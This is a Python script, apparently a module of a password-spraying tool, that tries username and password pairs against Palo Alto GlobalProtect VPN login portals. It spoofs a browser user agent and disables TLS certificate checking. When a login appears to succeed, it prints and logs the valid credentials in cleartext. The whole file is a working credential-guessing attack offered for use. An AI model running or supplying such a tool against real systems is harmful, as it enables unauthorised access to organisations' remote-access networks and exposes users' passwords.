#!/usr/bin/env python3

import requests
import warnings
# This is to suppress the insecure warning. If there is a better way please let me know
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore',InsecureRequestWarning)

def gp_conn(params):

    username = params.get("username")
    password = params.get("password")
    host = params.get("host")
    count = params.get("count")
    place = params.get("place")
    filelogger = params.get("filelogger")
    origin = 'https://' + host
    headerhost = host.split('/')[0]  
        
    gpurl = f"https://{host}/global-protect/login.esp"

    headers = {
        'Host': headerhost,
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '149',
        'Origin': origin,
        'DNT': '1',
        'Connection': 'close',
        'Referer' : gpurl,
        'Cookie': 'PHPSESSID=f7d08e4f708432cc978e782fcd710f8d',
        'Upgrade-Insecure-Requests': '1'
    }

    data = "prot=https:&server={}&action=getsoftware&user={}&passwd={}&ok=Log+In".format(host,username,password)

    #data = "prot=https%3A&server={}&inputStr=&action=getsoftware&user={}&passwd={}&new-passwd=&confirm-new-passwd=&ok=Log+In".format(host,username,password)

    try:

        # print the host , username and password being checked
        print(f"ACCOUNT CHECK: [GLOBALPROTECT] Target: {host} User: {username} [{place} of {count}, {place} completed] Password: {password}")
        query = requests.post(gpurl,data=data,headers=headers, verify=False, allow_redirects=True)
        
        if query.status_code == 200:
            print(f"ACCOUNT FOUND: [GLOBALPROTECT] Target: {host} User: {username} Password: {password} [SUCCESS - MFA Enabled]")
            if filelogger != None:
                filelogger.debug(f"ACCOUNT FOUND: [GLOBALPROTECT] Target: {host} User: {username} Password: {password} [SUCCESS - MFA Enabled]")

        else:
            for resp in query.history:
                if "/global-protect/" in resp.headers['Location']:
                    print(f"ACCOUNT FOUND: [GLOBALPROTECT] Target: {host} User: {username} Password: {password} [SUCCESS]")
                    if filelogger != None:
                        filelogger.debug(f"ACCOUNT FOUND: [GLOBALPROTECT] Target: {host} User: {username} Password: {password} [SUCCESS]")
    except:
        pass
